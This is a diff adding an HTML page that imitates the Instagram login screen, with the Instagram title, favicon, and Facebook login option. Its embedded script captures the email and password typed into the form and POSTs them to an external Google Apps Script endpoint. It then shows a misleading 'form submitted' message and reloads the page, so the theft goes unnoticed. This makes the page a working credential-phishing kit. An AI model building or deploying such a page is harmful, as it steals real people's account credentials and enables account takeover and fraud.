@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="insta.css">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
+</head>
+<body>
+    <form name="login-details",action="ojt attendence2.html">
+        <div>
+        <fieldset class="ab">
+        <h1>Instagram</h1>
+        <div class="a">
+        <input type="email" name="email" placeholder="Phone number, username, or email" required>
+        <br>
+        <input type="password" name="password" placeholder="password" required>
+        <br>
+        </div>
+        <div class="b"><button>Log in</button></div>
+        <fieldset class="d">
+            <legend>OR</legend>
+            <div class="e"><img src="https://cdn.pixabay.com/photo/2015/05/17/10/51/facebook-770688_1280.png" alt="facebook logo" height="15px" width="15px"><span>Log in with Facebook</span></div><br>
+            <div><span>Forgot password?</span></div>
+        </fieldset>
+        </fieldset>
+        </div>
+        <br>
+        <fieldset>
+            <div class="bc"><span>Don't have an account? <a href="#" style="text-decoration: none;">Sign up</a></span></div>
+        </fieldset>
+    </form>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwHYJ_iDBe7WUDjiBD22bjcc7X2gUHDyaNysU-EtClg-uEZuAUBrLFFU3cdYCq59MyxtQ/exec'
+        const form = document.forms['login-details']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thank you! your form is submitted successfully." ))
+            .then(() => {window.location.reload(); })
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
